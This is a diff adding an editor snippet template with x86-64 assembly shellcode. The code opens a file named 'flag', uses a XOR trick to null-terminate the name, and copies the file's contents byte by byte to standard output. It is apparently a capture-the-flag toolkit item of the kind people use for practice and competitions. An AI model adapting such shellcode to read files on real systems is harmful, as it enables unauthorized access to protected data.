@@ -1,0 +1,42 @@
+snippet shellcode "rwx shellcode"
+section .mytext    progbits  alloc   exec    write  align=16
+global      _start                              ;must be declared for linker (ld)
+_start:                                         ;tell linker entry point
+	jmp filename
+open:
+	; open("flagA", 0, 0)
+	pop rdi
+	xor BYTE [rdi + 4], 0x41
+	xor rsi, rsi
+	xor rdx, rdx
+	push 2
+	pop rax
+	syscall
+
+	; read(fd, buf, 1)
+	push rax
+	pop r9
+read:
+	push r9
+	pop rdi
+	push rsp
+	pop rsi
+	push 1
+	pop rdx
+	xor rax, rax
+	syscall
+
+	; write(1, buf, 1)
+	push 1
+	pop rdi
+	push 1
+	pop rdx
+	push 1
+	pop rax
+	syscall
+	jmp read
+
+filename:
+	call open
+	db "flagA"
+endsnippet
